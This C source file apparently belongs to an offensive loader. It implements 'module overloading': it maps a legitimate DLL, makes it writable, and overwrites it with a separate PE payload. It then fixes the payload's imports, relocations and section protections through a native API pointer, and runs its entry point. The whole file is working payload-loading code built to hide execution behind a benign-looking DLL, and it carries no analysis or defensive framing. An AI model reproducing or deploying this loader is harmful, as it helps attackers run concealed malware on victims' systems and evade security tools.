#include "main.h"
#include "structs.h"


/*----------------------------------
  Parse the PE headers and populate
  the struct for further usage
----------------------------------*/
BOOL InitPE(PPEHDRS pPeHdrs, CONTENT cnt) {

	DEBUG_PRINT("[*] Parsing loaded PE file's headers\n");
	pPeHdrs->PeSize = cnt.size;
	pPeHdrs->pPeBuffer = cnt.data;

	//Get NT headers
	pPeHdrs->pNtHeaders = (PIMAGE_NT_HEADERS)(pPeHdrs->pPeBuffer + ((PIMAGE_DOS_HEADER)pPeHdrs->pPeBuffer)->e_lfanew);
	if (pPeHdrs->pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
		DEBUG_PRINT("[!] Cant find valid NT headers.\n");
		return FALSE;
	}

	//Check if DLL or not
	if (pPeHdrs->pNtHeaders->FileHeader.Characteristics & IMAGE_FILE_DLL) {
		DEBUG_PRINT("[*] Image is a valid DLL\n");
		pPeHdrs->IsDLL = TRUE;
	}
	else {
		pPeHdrs->IsDLL = FALSE;
	}

	DEBUG_PRINT("\t> Populating Data Directories\n");
	pPeHdrs->pSectHeader = IMAGE_FIRST_SECTION(pPeHdrs->pNtHeaders);
	pPeHdrs->pImportDir = &pPeHdrs->pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	pPeHdrs->pExportDir = &pPeHdrs->pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	pPeHdrs->pRelocDir = &pPeHdrs->pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	pPeHdrs->pExceptDir = &pPeHdrs->pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
	pPeHdrs->pTslDir = &pPeHdrs->pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
	DEBUG_PRINT("\t> Parsing finished\n");
	return TRUE;
}


/*--------------------------------
 Apply the PE relocations
--------------------------------*/
BOOL ApplyRelocations(PIMAGE_DATA_DIRECTORY pBaseRelocDir, ULONG_PTR pBaseAddr, ULONG_PTR pPrefAddr) {

	DEBUG_PRINT("\t> Processing relocations table\n");
	PIMAGE_BASE_RELOCATION pBaseReloc = (pBaseAddr + pBaseRelocDir->VirtualAddress);
	ULONG_PTR delta = pBaseAddr - pPrefAddr;

	PBASE_RELOCATION_ENTRY pRelocEntry = NULL;

	//loop trough all relocation blocks
	while (pBaseReloc->VirtualAddress) {

		//pointer to the first relocation entry
		pRelocEntry = (PBASE_RELOCATION_ENTRY)(pBaseReloc + 1);

		//loop trough all relocation entries in the current block
		while ((PBYTE)pRelocEntry != (PBYTE)pBaseReloc + pBaseReloc->SizeOfBlock) {

			//Process the entry based on type
			switch (pRelocEntry->Type) {
			case IMAGE_REL_BASED_DIR64:
				*((ULONG_PTR*)(pBaseAddr + pBaseReloc->VirtualAddress + pRelocEntry->Offset)) += delta;
				break;

			case IMAGE_REL_BASED_HIGHLOW:
				*((DWORD*)(pBaseAddr + pBaseReloc->VirtualAddress + pRelocEntry->Offset)) += (DWORD)delta;
				break;

			case IMAGE_REL_BASED_HIGH:
				*((WORD*)(pBaseAddr + pBaseReloc->VirtualAddress + pRelocEntry->Offset)) += HIWORD(delta);
				break;

			case IMAGE_REL_BASED_LOW:
				*((WORD*)(pBaseAddr + pBaseReloc->VirtualAddress + pRelocEntry->Offset)) += LOWORD(delta);
				break;

			case IMAGE_REL_BASED_ABSOLUTE:
				break;

			default:
				DEBUG_PRINT("[!] Relocation type is uknown: %d\n", pRelocEntry->Type);
				break;
			}
			//Move to next entry
			pRelocEntry++;
		}
		pBaseReloc = (PIMAGE_BASE_RELOCATION)pRelocEntry;
	}
	DEBUG_PRINT("\t> Finished applying relocations\n");

	return TRUE;
}



/*----------------------------------------
  Fix the PE's import table
----------------------------------------*/
BOOL FixImports(PIMAGE_DATA_DIRECTORY pImportTable, PBYTE pPeBaseAddr) {

	DEBUG_PRINT("\t> Resolving the PE's import table\n");

	//Pointer for a import descriptor for a particular DLL
	PIMAGE_IMPORT_DESCRIPTOR pImportDesc = NULL;

	//Loop trough import descriptors
	for (SIZE_T i = 0; i < pImportTable->Size; i += sizeof(IMAGE_IMPORT_DESCRIPTOR)) {

		//Get the current descriptor
		pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)(pPeBaseAddr + pImportTable->VirtualAddress + i);

		//if both thunks are null the end of the import table is reached
		if (pImportDesc->OriginalFirstThunk == NULL && pImportDesc->FirstThunk == NULL) {
			DEBUG_PRINT("\t> Reached the end of the import descriptors array\n");
			break;
		}

		//Get info from the current descriptor
		LPSTR DllName = (LPSTR)(pPeBaseAddr + pImportDesc->Name);  //Dll Name
		ULONG_PTR uOrgFirstThunkRVA = pImportDesc->OriginalFirstThunk;
		ULONG_PTR uFirstThunkRVA = pImportDesc->FirstThunk;
		SIZE_T ThunkSize = 0x00; // Used to move to the next function (iterating through the IAT and INT)
		HMODULE hModule = NULL;

		//Try to load the DLL that is refenreced in the import descriptor
		hModule = LoadLibraryA(DllName);
		if (!hModule) {
			DEBUG_PRINT("[!] Could not load DLL: %s\n", DllName);
			return FALSE;
		}

		//Loop trough the imported functions
		while (TRUE) {

			//Get pointers to the thunk data
			PIMAGE_THUNK_DATA pOrgFirstThunk = (PIMAGE_THUNK_DATA)(pPeBaseAddr + uOrgFirstThunkRVA + ThunkSize);
			PIMAGE_THUNK_DATA pFirstThunk = (PIMAGE_THUNK_DATA)(pPeBaseAddr + uFirstThunkRVA + ThunkSize);
			PIMAGE_IMPORT_BY_NAME pImportByName = NULL;
			PVOID pFuncAddress = NULL;

			// At this point both 'pOrgFirstThunk' & 'pFirstThunk' will have the same values
			// However, to populate the IAT (pFirstThunk), one should use the INT (pOriginalFirstThunk) to retrieve the 
			// functions addresses and patch the IAT (pFirstThunk->u1.Function) with the retrieved address.
			if (pOrgFirstThunk->u1.Function == NULL && pFirstThunk->u1.Function == NULL) {
				break;
			}


			//if ordinal flag is set get the function's address trough its ordinal, else trough its name
			if (IMAGE_SNAP_BY_ORDINAL(pOrgFirstThunk->u1.Ordinal)) {
				pFuncAddress = GetProcAddress(hModule, IMAGE_ORDINAL(pOrgFirstThunk->u1.Ordinal));
				//DEBUG_PRINT("\t> Resolved function by ordinal, %s -> %d\n", DllName, (int)pOrgFirstThunk->u1.Ordinal);
				if (!pFuncAddress) {
					DEBUG_PRINT("[!] Cant find the address of function, %s -> %d\n", DllName, (int)pOrgFirstThunk->u1.Ordinal);
					return FALSE;
				}
			}
			//Get the address trough the function's name
			else {
				pImportByName = (PIMAGE_IMPORT_BY_NAME)(pPeBaseAddr + pOrgFirstThunk->u1.AddressOfData);
				pFuncAddress = GetProcAddress(hModule, pImportByName->Name);
				//DEBUG_PRINT("\t> Resolved function, %s -> %s\n", DllName, pImportByName->Name);
				if (!pFuncAddress) {
					DEBUG_PRINT("[!] Cant find the address of function, %s -> %s\n", DllName, pImportByName->Name);
					return FALSE;
				}
			}

			//Populate the address in the IAT
			pFirstThunk->u1.Function = (ULONGLONG)pFuncAddress;

			//Move to next function in the arrays
			ThunkSize += sizeof(IMAGE_THUNK_DATA);
		}
	}
	return TRUE;
}



/*------------------------------------------
  Fix the PE sections's memory permissions
------------------------------------------*/
BOOL FixMem(ULONG_PTR pPeBaseAddr, PIMAGE_NT_HEADERS pNtHdrs, PIMAGE_SECTION_HEADER pSectHdrs) {

	DWORD old = 0;
	SIZE_T secSize = 0;
	PVOID secAddr = NULL;
	NTSTATUS status = NULL;

	DEBUG_PRINT("[*] Fixing sections memory permissions, number of sections: %d\n", pNtHdrs->FileHeader.NumberOfSections);

	//Loop trough each section
	for (DWORD i = 0; i < pNtHdrs->FileHeader.NumberOfSections; i++) {

		DWORD old = NULL, MemProtect = NULL;

		if (!pSectHdrs[i].SizeOfRawData && !pSectHdrs[i].VirtualAddress) {
			DEBUG_PRINT("[*] skipping..");
			continue;
		}

		DEBUG_PRINT("[*] Checking memory protection for section: %d\n", i);
		DEBUG_PRINT("\t> Section name: %s, size: %d\n", pSectHdrs[i].Name, pSectHdrs[i].SizeOfRawData);
		//Get memory permissions based on section characteristics
		if (pSectHdrs[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
			MemProtect = PAGE_WRITECOPY;
			DEBUG_PRINT("\t> PAGE_WRITECOPY\n");
		}
		if (pSectHdrs[i].Characteristics & IMAGE_SCN_MEM_READ) {
			MemProtect = PAGE_READONLY;
			DEBUG_PRINT("\t> PAGE_READONLY\n");
		}
		if ((pSectHdrs[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pSectHdrs[i].Characteristics & IMAGE_SCN_MEM_READ)) {
			MemProtect = PAGE_READWRITE;
			DEBUG_PRINT("\t> PAGE_READWRITE\n");
		}
		if (pSectHdrs[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
			MemProtect = PAGE_EXECUTE;
			DEBUG_PRINT("\t> PAGE_EXECUTE\n");
		}
		if ((pSectHdrs[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pSectHdrs[i].Characteristics & IMAGE_SCN_MEM_WRITE)) {
			MemProtect = PAGE_EXECUTE_WRITECOPY;
			DEBUG_PRINT("\t> PAGE_EXECUTE_WRITECOPY\n");
		}
		if ((pSectHdrs[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pSectHdrs[i].Characteristics & IMAGE_SCN_MEM_READ)) {
			MemProtect = PAGE_EXECUTE_READ;
			DEBUG_PRINT("\t> PAGE_EXECUTE_READ\n");
		}
		if (
			(pSectHdrs[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
			&& (pSectHdrs[i].Characteristics & IMAGE_SCN_MEM_WRITE)
			&& (pSectHdrs[i].Characteristics & IMAGE_SCN_MEM_READ)
			) {
			MemProtect = PAGE_EXECUTE_READWRITE;
			DEBUG_PRINT("\t> PAGE_EXECUTE_READWRITE\n");
		}

		secSize = pSectHdrs[i].SizeOfRawData;
		secAddr = (pPeBaseAddr + pSectHdrs[i].VirtualAddress);

		status = NtAPIs.pNtProtectVirtualMemory((HANDLE)-1, &secAddr, &secSize, MemProtect, &old);
		if (status != 0x00) {
			DEBUG_PRINT("[!] Failed applying memory protection for section: %d, error: 0x%X\n", i, status);
			return FALSE;
		}

	}

	DEBUG_PRINT("[*] Finished applying sections memory protections\n");
	return TRUE;
}


/*-------------------------------
  Overwrite the DLL with the 
  injected PE
-------------------------------*/
BOOL OverWrite(ULONG_PTR dllBase, SIZE_T dllSize, ULONG_PTR peBase, SIZE_T peSize) {

	DWORD old = 0;
	NTSTATUS status = NULL;

	DEBUG_PRINT("\t> Checking if the DLL and PE payload are valid\n");
	//Check if both start with MZ (valid DOS header)
	if (*(unsigned short*)dllBase != *(unsigned short*)peBase) {
		DEBUG_PRINT("[!] No valid DOS headers found\n");
		return FALSE;
	}

	DEBUG_PRINT("\t> Making the mapped DLL writable\n");
	//Switch memory protection on the mapped DLL
	SIZE_T szMapped = dllSize;
	status = NtAPIs.pNtProtectVirtualMemory((HANDLE)-1, &dllBase, &szMapped, PAGE_READWRITE, &old);
	if (status != 0x00) {
		DEBUG_PRINT("[!] Failed switching the mapped DLL to RW\n");
		return FALSE;
	}

	//Zeroing out and copying the PE
	mymemcpy(dllBase, NULL, dllSize);
	mymemcpy(dllBase, peBase, peSize);
	mymemcpy(peBase, NULL, peSize);       //Free the temporary buffer

	DEBUG_PRINT("\t> Finished overwriting\n");
	return TRUE;
}


/*----------------------------------------
  The main module overloading function
----------------------------------------*/
BOOL OverLoad(PPEHDRS pPeHdrs) {

	ULONG_PTR dllBase = NULL;
	SIZE_T dllSize = 0;
	PBYTE peEntry = NULL,
		PEBuffer = NULL;

	//Map the DLL
	if (!MapDLL(&dllBase, &dllSize)) {
		return FALSE;
	}

	//Check if the size match
	if (dllSize < pPeHdrs->pNtHeaders->OptionalHeader.SizeOfImage) {
		DEBUG_PRINT("[!] DLL size is smaller than the payload size: %d\n", pPeHdrs->pNtHeaders->OptionalHeader.SizeOfImage);
		return FALSE;
	}

	DEBUG_PRINT("[*] Allocating buffer for the PE\n");
	//Temp buffer to hold the PE
	PEBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pPeHdrs->pNtHeaders->OptionalHeader.SizeOfImage);
	if (!PEBuffer) {
		DEBUG_PRINT("[!] Failed allocating memory\n");
		return FALSE;
	}

	//Copy the DLL
	DEBUG_PRINT("\t> copying the PE headers\n");
	mymemcpy(PEBuffer, pPeHdrs->pPeBuffer, pPeHdrs->pNtHeaders->OptionalHeader.SizeOfHeaders);

	DEBUG_PRINT("\t> copying the PE sections\n");
	for (int i = 0; i < pPeHdrs->pNtHeaders->FileHeader.NumberOfSections; i++) {
		mymemcpy(
			(PVOID)(PEBuffer + pPeHdrs->pSectHeader[i].VirtualAddress),
			(PVOID)((ULONG_PTR)pPeHdrs->pPeBuffer + pPeHdrs->pSectHeader[i].PointerToRawData),
			pPeHdrs->pSectHeader[i].SizeOfRawData
		);
	}


	DEBUG_PRINT("[*] Processing the PE's IAT\n");
	if (!FixImports(pPeHdrs->pImportDir, PEBuffer)) {
		return FALSE;
	}

	DEBUG_PRINT("[*] Overwriting mapped DLL\n");
	if (!OverWrite(dllBase, dllSize, PEBuffer, pPeHdrs->pNtHeaders->OptionalHeader.SizeOfImage)) {
		return FALSE;
	}

	//The PEbuffer can now be freed
	HeapFree(GetProcessHeap(), 0, PEBuffer);

	DEBUG_PRINT("[*] Applying the PE's relocations\n");
	if (!ApplyRelocations(pPeHdrs->pRelocDir, dllBase, pPeHdrs->pNtHeaders->OptionalHeader.ImageBase)) {
		return FALSE;
	}

	DEBUG_PRINT("[*] Fixing the memory permissions of the PE's headers\n");
	//Fix the headers memory permissions to RO
	DWORD old = 0;
	SIZE_T pSize = pPeHdrs->pNtHeaders->OptionalHeader.SizeOfHeaders;
	NTSTATUS status = NtAPIs.pNtProtectVirtualMemory((HANDLE)-1, &dllBase, &pSize, PAGE_READONLY, &old);
	if (status != 0x00) {
		DEBUG_PRINT("[!] Failed changing the PE's headers memory permissions to RO: 0x%X\n", status);
		return FALSE;
	}


	//Fix the memory permissions of the PE's sections
	if (!FixMem(dllBase, pPeHdrs->pNtHeaders, pPeHdrs->pSectHeader)) {
		return FALSE;
	}

	
	DEBUG_PRINT("[*] Getting the PE's entrypoint\n");
	peEntry = (PBYTE)(dllBase + pPeHdrs->pNtHeaders->OptionalHeader.AddressOfEntryPoint);
	
	DEBUG_PRINT("\t> DllBase: 0x%p\n\t> Entry offset: 0x%p\n\t> Entrypoint: 0x%p\n", dllBase, pPeHdrs->pNtHeaders->OptionalHeader.AddressOfEntryPoint, peEntry);

	DEBUG_PRINT("[*] Executing the entrypoint\n");
	//Check if its DLL
	if (pPeHdrs->IsDLL) {
		DLLMAIN dllMain = (DLLMAIN)peEntry;
		return dllMain((HINSTANCE)dllBase, DLL_PROCESS_ATTACH, NULL);
	}
	else {
		MAIN pMain = (MAIN)peEntry;
		return pMain();
	}
}